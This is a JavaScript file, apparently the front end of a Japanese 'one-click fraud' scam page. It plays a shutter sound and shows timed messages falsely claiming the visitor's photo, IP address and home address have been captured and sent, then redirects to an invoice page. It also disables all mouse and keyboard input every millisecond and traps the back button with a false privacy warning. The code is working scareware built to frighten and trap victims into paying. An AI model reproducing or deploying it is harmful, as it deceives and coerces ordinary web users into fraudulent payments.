const app = new Vue({
    el: "#app",
    data: {
        message: "写真を撮影しました",
        seen: false
    },
    methods:{
        move() {
            const se = new Audio("shutter.mp3")
            se.play()
            this.seen = true
            setTimeout(() => {
                this.message = "写真を送信中..."
            }, 800)
            setTimeout(() => {
                this.message = "IPアドレスと取得中..."
            }, 1600)
            setTimeout(() => {
                this.message = "IPアドレスから住所を特定中..."
            }, 2400)
            setTimeout(() => {
                this.message = "情報を送信中..."
            }, 3200)
            setTimeout(() => {
                location.href = "invoice.html"
            }, 4000)
        }
    }
})





setInterval(() => {
    document.ondblclick = function () {return false;}
    document.onmousedown = function () {return false;}
    document.onmouseup = function () {return false;}
    document.oncontextmenu = function () {return false;}
    document.onkeydown = function () {return false;}
    document.onkeyup = function () {return false;}
  }, 1);

  history.pushState(null, null, location.href);
  window.addEventListener('popstate', (e) => {
    confirm("個人情報保護のため戻れません。")
    history.go(1);
  });

  window.addEventListener('beforeunload', function(e) {
}, false);
